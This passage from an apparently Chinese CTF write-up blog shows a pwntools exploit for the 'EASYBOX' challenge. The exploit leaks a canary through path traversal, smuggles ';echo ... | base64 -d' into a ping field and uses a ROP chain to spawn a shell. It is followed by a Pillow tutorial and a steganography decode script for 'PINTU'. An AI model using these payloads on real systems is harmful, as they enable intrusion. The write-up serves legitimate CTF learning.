title="EASYBOX"></a><strong><strong>EASYBOX</strong></strong></h2><p>这三道题，查看了出题人的博客，利用的是CVE（CVE-2023-40930）tql</p><p>学习到两种解法：</p><p>下载之后是一个docker文件压缩包，在bin下找到pwn文件，即分析的赛题，使用checksec发现开了canary，在init函数中查看到了canary.txt，main函数中存在“PING”,“CAT”,”LS”,“HELP”和“EXIT”功能，发现主要利用的是pingCommand()函数和catCommand()函数。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/example4.png"                      alt="Untitled 4"                ></p><p><code>pingCommand()</code> 函数先向s输入0xff个字节，通过<code>sprintf(command, &quot;ping -c 4 %s &gt; /tmp/result.txt&quot;, s);</code>将数据存在到command，从上面看<code>char command[520];</code> command大小为0x208，通过sprintf将s中的数据发给command遇到’\x00’字符就会结束(canary)，接着再执行system，还有check_ip的限制。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/DASCTFxCBCTF2023-Study&Re.assets/PING.png"                      alt="PING"                ></p><h3 id="1-命令注入"><a href="#1-命令注入" class="headerlink" title="(1) 命令注入"></a>(1) 命令注入</h3><h3 id="2-栈溢出"><a href="#2-栈溢出" class="headerlink" title="(2) 栈溢出"></a>(2) 栈溢出</h3><p>分析pwn文件其中的catCommand函数通过fread从一个文件中读取数据存在栈上的数组，存在栈溢出</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=<span class="keyword">lambda</span>: r.interactive()</span><br><span class="line">sl=<span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla=<span class="keyword">lambda</span> a,b: r.sendlineafter(a,b)</span><br><span class="line">se=<span class="keyword">lambda</span> a: r.send(a)</span><br><span class="line">sa=<span class="keyword">lambda</span> a,b: r.sendafter(a,b)</span><br><span class="line">lg=<span class="keyword">lambda</span> name,data: log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(data))</span><br><span class="line">rcu=<span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>():</span><br><span class="line">gdb.attach(r)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">global</span> r</span><br><span class="line"><span class="keyword">global</span> libc</span><br><span class="line"><span class="keyword">global</span> ef</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27362</span>)</span><br><span class="line"><span class="comment">#ef = ELF(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment">#ef.checksec()</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401ce3</span></span><br><span class="line">system = <span class="number">0x401230</span></span><br><span class="line">sh = <span class="number">0x402090</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">## leak canary</span></span><br><span class="line">sla(<span class="string">&quot;name:&quot;</span>,<span class="string">&quot;nameless&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;CAT&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;view:&quot;</span>,<span class="string">&quot;../secret/canary.txt&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;canary&quot;</span>,canary)</span><br><span class="line"><span class="comment">## stack overflow attack</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;PING&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(sh)</span><br><span class="line">+ p64(ret) +p64(system)</span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">pd = <span class="string">&quot;;echo &quot;</span>+<span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">pd += payload</span><br><span class="line">pd += <span class="string">&#x27;&quot; | base64 -d&#x27;</span></span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">sla(<span class="string">&quot;address:&quot;</span>,pd)</span><br><span class="line"><span class="comment">## get shell</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;CAT&quot;</span>)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">sla(<span class="string">&quot;view: &quot;</span>,<span class="string">&quot;result.txt&quot;</span>)</span><br><span class="line">io()</span><br></pre></td></tr></table></figure></div><p>本文仅为学习记录，无商业作用。</p><blockquote><p>参考链接：</p><p><a class="link"   href="https://www.cnblogs.com/mumuhhh/p/17781029.html" >https://www.cnblogs.com/mumuhhh/p/17781029.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://docs.python.org/3/library/marshal.html" >https://docs.python.org/3/library/marshal.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://blog.csdn.net/mldxs/article/details/8574518" >https://blog.csdn.net/mldxs/article/details/8574518 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/#canary_3" >https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/#canary_3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://nameless.top/index.php/2023/10/22/das10%e6%9c%88%e6%9c%88%e8%b5%9bpwn%e5%87%ba%e9%a2%98%e5%bf%83%e8%b7%afcve-2023-40930%e7%9a%84%e4%bb%8b%e7%bb%8d/" >DAS10月月赛PWN出题心路&amp;&amp;CVE-2023-40930的介绍 – Nameless的摸鱼笔记 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://blog.csdn.net/weixin_51890658/article/details/134048110" >https://blog.csdn.net/weixin_51890658&#x2F;article&#x2F;details&#x2F;134048110 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://www.cnblogs.com/ModesL/p/17794355.html" >https://www.cnblogs.com/ModesL/p/17794355.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="ctf_Replay" scheme="https://juana-2u.github.io/tags/ctf-Replay/"/>
    
  </entry>
  
  <entry>
    <title>2023香山杯复现与学习[231016]</title>
    <link href="https://juana-2u.github.io/2023/10/18/2023XiangShan-Replay/"/>
    <id>https://juana-2u.github.io/2023/10/18/2023XiangShan-Replay/</id>
    <published>2023-10-18T12:02:45.000Z</published>
    <updated>2023-11-09T12:04:43.270Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PINTU"><a href="#PINTU" class="headerlink" title="PINTU"></a>PINTU</h2><h3 id="STU：图片隐写"><a href="#STU：图片隐写" class="headerlink" title="STU：图片隐写"></a>STU：图片隐写</h3><p>使用python库：pillow&amp;PIL</p><p>安装</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure></div><p>使用方法</p><ol><li><p>使用open加载图片</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;Mycat.jpg&#x27;</span>) <span class="comment">#im是一个Image对象，属性有format，size，mode</span></span><br><span class="line"><span class="comment">#format是格式，size是元组，表示宽和高，mode是图片的模式</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> im.<span class="built_in">format</span>, im.size,im.mode</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#console输出如下：</span></span><br><span class="line">JPEG(<span class="number">245</span>,<span class="number">280</span>) RGB</span><br></pre></td></tr></table></figure></div></li><li><p>使用show来调试和测试，呈现图片</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure></div></li><li><p>图片的读写操作</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">infile = <span class="string">&#x27;Mycat.jpg&#x27;</span></span><br><span class="line">f,e = os.path.splitext(infile)</span><br><span class="line">outfile = f + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">Image.<span class="built_in">open</span>(infile).save(outfile)</span><br><span class="line"><span class="keyword">except</span> IOError</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;cannot convert&quot;</span>,infile</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#image.open() 读文件</span></span><br><span class="line"><span class="comment">#image.save() 保存文件  save方法来进行图片的格式转换</span></span><br><span class="line"><span class="comment">#os模块中的os.path.splitext() 方法可以讲文件名和拓展名分离开，图片的格式转换</span></span><br></pre></td></tr></table></figure></div></li><li><p>图片的操作</p><ol><li><p>图片剪切</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">150</span>,<span class="number">150</span>,<span class="number">245</span>,<span class="number">280</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line">region.show()</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#crop() 方法来从图片中剪切一块区域，上面是提取矩形</span></span><br></pre></td></tr></table></figure></div></li><li><p>图片黏贴</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">50</span>,<span class="number">50</span>,<span class="number">200</span>,<span class="number">200</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line"><span class="comment">#逆转180到原来位置</span></span><br><span class="line">region = region.transpose(Image.ROTATE_180)</span><br><span class="line">im.paste(region,box)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure></div></li></ol></li><li><p>图像序列</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">form PIL <span class="keyword">import</span> image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;cat.gif&quot;</span>)</span><br><span class="line">im.seek(<span class="number">1</span>)</span><br><span class="line">im.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">im.show()</span><br><span class="line"><span class="keyword">except</span> EOFError</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#GIF多帧图片，即序列文件，PIL自动打开序列文件的第一帧，seek和tell方法在不同帧移动</span></span><br><span class="line"><span class="comment">#tell--&gt;帧数 seek--&gt;取当前帧数</span></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#while循环</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;cat.gif&quot;</span>)</span><br><span class="line">im.seek(<span class="number">1</span>)</span><br><span class="line">im.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">im.show()</span><br><span class="line"><span class="keyword">except</span> EOERROr</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#for循环 ImageSequence模块的Iterator方法</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageSequence</span><br><span class="line"> </span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;cat.gif&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> frame <span class="keyword">in</span> ImageSequence.Iterator(im):</span><br><span class="line">frame.show()</span><br></pre></td></tr></table></figure></div></li><li><p>读取像素和修改像素</p></li></ol><hr><h3 id="EXP1：PINTU"><a href="#EXP1：PINTU" class="headerlink" title="EXP1：PINTU"></a>EXP1：PINTU</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">r&quot;./pintu&quot;</span></span><br><span class="line">file_list = os.listdir(path) <span class="comment">#路径下的所有文件</span></span><br><span class="line">size_list = []</span><br><span class="line"></span><br><span class="line">bin_data = <span class="string">&quot; &quot;</span> <span class="comment">#获取二进制</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">4704</span>):</span><br><span class="line">    im_path = path +<span class="string">f&quot;\&#123;i&#125;.png&quot;</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(im_path)</span><br><span class="line"></span><br><span class="line">    size = im.size</span><br><span class="line">    size_list.append(size[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    pixel = im.getpixel((<span class="number">0</span>,<span class="number">0</span>)) <span class="comment">#获取图像中的像素的RGB颜色值 getpixel的参数是一个像素点的坐标</span></span><br><span class="line">    <span class="comment"># RGB模式(RED，GREEN，BLUE) （0，0）表示像素点的坐标</span></span><br><span class="line">    <span class="keyword">if</span> pixel ==(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>):    <span class="comment">#二进制白色是0</span></span><br><span class="line">        bin_data += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bin_data +=<span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;BIN_DATA:&quot;</span>,bin_data) <span class="comment">#打印二进制</span></span><br><span class="line">int_data = <span class="built_in">int</span>(bin_data,<span class="number">2</span>) <span class="comment">#解码二进制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;INT_DATA:&quot;</span>,int_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;DATA_OUT:&quot;</span>,long_to_bytes(int_data).decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">size_data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(size_list)):</span><br><span class="line">    size_data += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(size_list[i]),<span class="number">8</span>)) <span class="comment">#高度size 10进制改为8进制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SIZE_DATAL:&quot;</span>,size_data)</span><br><span class="line"></span><br><span class="line">data = size_data.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">data_out = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data_out += <span class="built_in">chr</span>(<span class="built_in">int</span>(data[i]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;DATA_OUT:&quot;</span>,data_out)</span><br></pre></td></tr></table></figure></div><p>运行结果：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">D:\CollegeStudy\Python_code\venv\Scripts\python.exe D:/CTF_Tools/CTF_Scripts/MISC/PINTU.py</span><br><span class="line">BIN_DATA:  <span class="numberspan></span><br><span class="line">INT_DATA: <span class="number">443872932387609604135299396505741465548187173913201730108838080408785609137741615659037699726062198174374869846350512862150233184688689942668777612350764221752081411865206415112660714146757211490177058729438092152878841125207571476701274343774749929595131015975243112000147909250609222224386395250420482153027423916850849907783377689363926605283859634466699503398576742091148637222466493674839458477079907442027781797995563797242127070058619307420720083582989814955638708836061722624212645970329914685584560535046789049745626271660729695633393935782143286042187281494621731489627398825041304828103510723776145870421596844268308768106563173361340578036769631671222365662779295856082169735142106857685245787867868939877997807147264885029965288918778095901444599350328636038539550470594610996135016178903533546176756754366885849810986458832457425478791696994121501106351218323543932789426433991366669735850704517003574890852690894671642558319499970231221568249671785792844423548113062674756417573895156509357966378010843640665977535211058606619931728275406042671149290064241331353833192521327454578922439604729609725523724886701113628781775137675047788670751939245996145899093702530500651486751530440279280899185557843975159425298926732152946633813864493232128464695128151024516359972838671657905047765173875917851092890649577562083138460019500783760812685048126396136492082495748040267453981267617425848056387144300693</span></span><br><span class="line">DATA_OUT: flag看到666c是不是特别兴奋，很可惜flag并不在这。（狗头保命），既然走到了这里，那我也给一个通关的关键信息拿去吧，去找到真正的flag吧：sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W                                 哎，对了。拿走之前看一看我精心挑选的笑话吧：猎人打猎，朝狐狸开枪，“砰”地一声枪响之后猎人死了。狐狸叉着腰，冷笑一声：</span><br><span class="line">“没想到吧，我是反射弧。”好不好笑， 有没有感觉一哆嗦，大脑更清晰了。ฅ՞•ﻌ•՞ ต</span><br><span class="line"></span><br><span class="line">SIZE_DATAL: <span class="number">74</span> <span class="number">82</span> <span class="number">70</span> <span class="number">84</span> <span class="number">67</span> <span class="number">53</span> <span class="number">83</span> <span class="number">70</span> <span class="number">71</span> <span class="number">53</span> <span class="number">83</span> <span class="number">85</span> <span class="number">52</span> <span class="number">83</span> <span class="number">84</span> <span class="number">86</span> <span class="number">72</span> <span class="number">66</span> <span class="number">84</span> <span class="number">84</span> <span class="number">67</span> <span class="number">82</span> <span class="number">50</span> <span class="number">83</span> <span class="number">75</span> <span class="number">86</span> <span class="number">83</span> <span class="number">69</span> <span class="number">50</span> <span class="number">78</span> <span class="number">75</span> <span class="number">86</span> <span class="number">73</span> <span class="number">85</span> <span class="number">89</span> <span class="number">70</span> <span class="number">67</span> <span class="number">83</span> <span class="number">50</span> <span class="number">77</span> <span class="number">79</span> <span class="number">86</span> <span class="number">70</span> <span class="number">85</span> <span class="number">87</span> <span class="number">77</span> <span class="number">76</span> <span class="number">76</span> <span class="number">71</span> <span class="number">86</span> <span class="number">75</span> <span class="number">87</span> <span class="number">73</span> <span class="number">84</span> <span class="number">75</span> <span class="number">76</span> <span class="number">74</span> <span class="number">90</span> <span class="number">83</span> <span class="number">69</span> <span class="number">50</span> <span class="number">78</span> <span class="number">75</span> <span class="number">86</span> <span class="number">77</span> <span class="number">82</span> <span class="number">70</span> <span class="number">85</span> <span class="number">87</span> <span class="number">89</span> <span class="number">51</span> <span class="number">69</span> <span class="number">74</span> <span class="number">85</span> <span class="number">51</span> <span class="number">86</span> <span class="number">75</span> <span class="number">90</span> <span class="number">67</span> <span class="number">78</span> <span class="number">71</span> <span class="number">86</span> <span class="number">75</span> <span class="number">85</span> <span class="number">50</span> <span class="number">83</span> <span class="number">75</span> <span class="number">81</span> <span class="number">77</span> <span class="number">78</span> <span class="number">88</span> <span class="number">69</span> <span class="number">50</span> <span class="number">87</span> <span class="number">67</span> <span class="number">86</span> <span class="number">77</span> <span class="number">82</span> <span class="number">71</span> <span class="number">84</span> <span class="number">75</span> <span class="number">86</span> <span class="number">75</span> <span class="number">78</span> <span class="number">77</span> <span class="number">77</span> <span class="number">50</span> <span class="number">88</span> <span class="number">77</span> <span class="number">82</span> <span class="number">75</span> <span class="number">76</span> <span class="number">71</span> <span class="number">69</span> <span class="number">50</span> <span class="number">85</span> <span class="number">83</span> <span class="number">53</span> <span class="number">83</span> <span class="number">69</span> <span class="number">79</span> <span class="number">70</span> <span class="number">87</span> <span class="number">84</span> <span class="number">77</span> <span class="number">82</span> <span class="number">68</span> <span class="number">82</span> <span class="number">78</span> <span class="number">90</span> <span class="number">86</span> <span class="number">84</span> <span class="number">79</span> <span class="number">53</span> <span class="number">76</span> <span class="number">78</span> <span class="number">71</span> <span class="number">90</span> <span class="number">67</span> <span class="number">71</span> <span class="number">89</span> <span class="number">87</span> <span class="number">68</span> <span class="number">86</span> <span class="number">79</span> <span class="number">86</span> <span class="number">89</span> <span class="number">85</span> <span class="number">71</span> <span class="number">53</span> <span class="number">75</span> <span class="number">89</span> <span class="number">75</span> <span class="number">86</span> <span class="number">87</span> <span class="number">84</span> <span class="number">77</span> <span class="number">82</span> <span class="number">68</span> <span class="number">82</span> <span class="number">77</span> <span class="number">82</span> <span class="number">66</span> <span class="number">71</span> <span class="number">52</span> <span class="number">90</span> <span class="number">68</span> <span class="number">78</span> <span class="number">71</span> <span class="number">90</span> <span class="number">74</span> <span class="number">69</span> <span class="number">52</span> <span class="number">84</span> <span class="number">76</span> <span class="number">87</span> <span class="number">73</span> <span class="number">82</span> <span class="number">89</span> <span class="number">87</span> <span class="number">73</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">79</span> <span class="number">86</span> <span class="number">87</span> <span class="number">84</span> <span class="number">77</span> <span class="number">85</span> <span class="number">83</span> <span class="number">79</span> <span class="number">77</span> <span class="number">82</span> <span class="number">71</span> <span class="number">88</span> <span class="number">75</span> <span class="number">52</span> <span class="number">76</span> <span class="number">79</span> <span class="number">78</span> <span class="number">77</span> <span class="number">50</span> <span class="number">86</span> <span class="number">75</span> <span class="number">51</span> <span class="number">74</span> <span class="number">87</span> <span class="number">73</span> <span class="number">82</span> <span class="number">87</span> <span class="number">71</span> <span class="number">73</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">77</span> <span class="number">82</span> <span class="number">87</span> <span class="number">84</span> <span class="number">77</span> <span class="number">85</span> <span class="number">83</span> <span class="number">86</span> <span class="number">74</span> <span class="number">86</span> <span class="number">51</span> <span class="number">70</span> <span class="number">69</span> <span class="number">86</span> <span class="number">76</span> <span class="number">69</span> <span class="number">74</span> <span class="number">85</span> <span class="number">50</span> <span class="number">88</span> <span class="number">75</span> <span class="number">90</span> <span class="number">67</span> <span class="number">67</span> <span class="number">78</span> <span class="number">90</span> <span class="number">75</span> <span class="number">87</span> <span class="number">73</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">74</span> <span class="number">90</span> <span class="number">83</span> <span class="number">69</span> <span class="number">50</span> <span class="number">78</span> <span class="number">75</span> <span class="number">86</span> <span class="number">78</span> <span class="number">90</span> <span class="number">86</span> <span class="number">84</span> <span class="number">79</span> <span class="number">86</span> <span class="number">76</span> <span class="number">69</span> <span class="number">74</span> <span class="number">85</span> <span class="number">50</span> <span class="number">86</span> <span class="number">67</span> <span class="number">87</span> <span class="number">68</span> <span class="number">86</span> <span class="number">71</span> <span class="number">86</span> <span class="number">75</span> <span class="number">85</span> <span class="number">75</span> <span class="number">84</span> <span class="number">76</span> <span class="number">69</span> <span class="number">79</span> <span class="number">70</span> <span class="number">87</span> <span class="number">84</span> <span class="number">77</span> <span class="number">82</span> <span class="number">68</span> <span class="number">77</span> <span class="number">77</span> <span class="number">82</span> <span class="number">71</span> <span class="number">84</span> <span class="number">75</span> <span class="number">86</span> <span class="number">75</span> <span class="number">89</span> <span class="number">79</span> <span class="number">85</span> <span class="number">51</span> <span class="number">88</span> <span class="number">73</span> <span 